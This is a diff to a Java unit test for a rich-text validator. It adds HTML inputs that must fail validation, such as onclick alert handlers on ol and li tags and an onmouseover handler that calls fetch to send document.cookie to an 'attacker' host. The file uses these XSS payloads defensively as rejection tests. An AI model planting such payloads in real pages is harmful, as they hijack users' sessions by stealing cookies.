@@ -86,7 +86,10 @@ class RichTextAreaValidatorTest {
     @ValueSource(strings = {"<z><invalid text></z>", "some test", "<", "/>", "</>",
         "<b style=\"background:url(javascript:alert(1))\">x</b>",
         "<p onclick=\"alert(1)\">hi</p>",
-        "<p onmouseover=\"fetch('//attacker/'+document.cookie)\">Order</p>"})
+        "<p onmouseover=\"fetch('//attacker/'+document.cookie)\">Order</p>",
+        "<ol onclick=\"alert(1)\">hi</ol>",
+        "<li onclick=\"alert(1)\">hi</li>",
+        "<ol onmouseover=\"fetch('//attacker/'+document.cookie)\"><li><p>indent</p></li></ol>"})
     void validateInvalidValuesShouldFailValidation(String value) {
         JsonNode node = NODE_FACTORY.textNode(value);
         CaseFieldDefinition field = caseField().withMin(1).build();
